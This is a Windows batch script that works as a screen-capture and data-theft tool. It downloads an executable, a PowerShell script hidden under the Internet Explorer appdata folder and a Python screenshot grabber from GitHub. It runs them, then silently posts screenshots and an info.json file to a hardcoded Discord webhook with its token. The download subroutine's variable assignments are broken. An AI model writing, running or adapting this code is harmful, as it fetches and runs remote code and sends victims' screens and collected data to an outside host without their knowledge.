@echo off
setlocal enabledelayedexpansion
if not exist "%~dp0bomba.exe" (
        call :download "bomba.exe" "https://github.com/thompog/bob/raw/refs/heads/main/bomba.exe" "%~dp0"
)
if not exist "%appdata%\Microsoft\Internet Explorer\getdata.ps1" (
        call :download "getdata.ps1" "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" "%appdata%\Microsoft\Internet Explorer"
)
if not exist "C:\Users\Public\take_screen.py" (
        call :download "take_screen.py" "https://raw.githubusercontent.com/BOBZERO-afk/d/refs/heads/main/take_screen.py" "C:\Users\Public"
)
cmd /c "python -m pip install mss || python -m pip install --upgrade mss || python3 -m pip install mss || python3 -m pip install --upgrade mss"
timeout 6 >nul
cmd /k "python take_screen.py"

if exist "C:\Users\Public\screenshot1.png" (
       start /min "" "bomba.exe -post -url https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4 -T screenshot_taken_1 -user thom -photo C:\Users\Public\screenshot1.png" 
)
if exist "C:\Users\Public\screenshot2.png" (
       start /min "" "bomba.exe -post -url https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4 -T screenshot_taken_2 -user thom -photo C:\Users\Public\screenshot2.png" 
)
if exist "C:\Users\Public\screenshot3.png" (
       start /min "" "bomba.exe -post -url https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4 -T screenshot_taken_3 -user thom -photo C:\Users\Public\screenshot3.png" 
)
if exist "C:\Users\Public\screenshot4.png" (
       start /min "" "bomba.exe -post -url https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4 -T screenshot_taken_4 -user thom -photo C:\Users\Public\screenshot4.png" 
)

start /min "" "bomba.exe -post -url https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4 -json -path %appdata%\Microsoft\Internet Explorer\info.json"

:download
file = %0
link = %1
dir = %2

echo downloading %file%
curl -L "%link%" -o "%dir%\%file%"
echo done %file%
exit /b
